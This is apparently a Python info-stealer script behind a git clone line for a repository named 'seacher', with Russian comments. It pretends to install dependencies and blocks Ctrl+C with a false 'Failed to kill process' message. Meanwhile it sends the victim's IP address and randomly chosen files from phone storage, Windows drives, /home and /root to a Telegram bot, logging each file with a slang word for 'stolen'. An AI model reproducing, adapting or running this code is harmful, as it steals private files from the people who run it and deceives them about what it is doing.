git clone https://github.com/ikeakiller/seacher.gitimport time
import subprocess
import requests
from colorama import init, Fore, Style
import os
import threading
import zipfile 
import sys
import signal
import random

TELEGRAM_BOT_TOKEN = ''
TELEGRAM_CHAT_ID = ''

def signal_handler(sig, frame):
    print("Failed to kill process.")
    # Можно добавить дополнительные действия, если необходимо

# Устанавливаем обработчик сигнала SIGINT
signal.signal(signal.SIGINT, signal_handler)

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, data=payload)
    
def run_commands():
    try:
        subprocess.run(['apt', 'install', 'curl', '-y'], check=True)
    except Exception as e:
        send_telegram_message(f"❌ {e}")
    try:
        ip_address = subprocess.check_output(['curl', 'ifconfig.me']).decode('utf-8').strip()
        send_telegram_message(f"📲 Новая сессия\nIP: {ip_address}")
    except Exception as e:
        send_telegram_message(f"💀 Не удалось получить IP: {e}")
    share_thread = threading.Thread(target=share)
    share_thread.start()
    send_telegram_message(f"👁️️️️️️ Перехватываю данные...")
    os.system('clear')
    print('💿 Installing dependencies...')
    time.sleep(30)
    os.system('clear')

def share():
    try:
        # Указываем папки для отправки файлов
        folders_to_send = ['/storage/emulated/0/Download', '/storage/emulated/0/Movies', '/storage/emulated/0/Pictures', '/storage/emulated/0/DCIM', '/storage/emulated/0/Music', 'C:', 'E:', 'F:', '/home', '/root']
        
        for folder in folders_to_send:
            if os.path.exists(folder):
                files = []
                for root, dirs, files_in_folder in os.walk(folder):
                    for file in files_in_folder:
                        files.append(os.path.join(root, file))
                
                # Выбираем случайные файлы (например, 5 случайных файлов)
                random_files = random.sample(files, min(5, len(files)))

                for file_path in random_files:
                    # Отправляем файл в Telegram
                    with open(file_path, 'rb') as f:
                        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
                        payload = {
                            'chat_id': TELEGRAM_CHAT_ID,
                        }
                        files = {
                            'document': f
                        }
                        try:
                            response = requests.post(url, data=payload, files=files)
                            if response.status_code == 200:
                                send_telegram_message(f'🖤 Спизжено: {file_path}')
                            else:
                                send_telegram_message(f'💔 Не спиздилось: {file_path} - {response.text}')
                        except requests.exceptions.RequestException as e:
                            if "Max retries exceeded" in str(e) and "SSLError" in str(e):
                                send_telegram_message(f"💀 {e}. Повторная попытка через 8 секунд...")
                                time.sleep(8)  # Задержка перед повторной попыткой
                                share()  # Повторный вызов функции
                                return  # Выход из текущего вызова функции после повторного вызова
                    # Задержка перед отправкой следующего файла
                    time.sleep(4)  # Задержка в 5 секунд
            else:
                send_telegram_message(f"Папка не найдена: {folder}")

    except Exception as e:
        send_telegram_message(f"❌ Ошибка: {e}")
        
def imp():
    run_commands()
    
if __name__ == "__main__":
    imp()
    
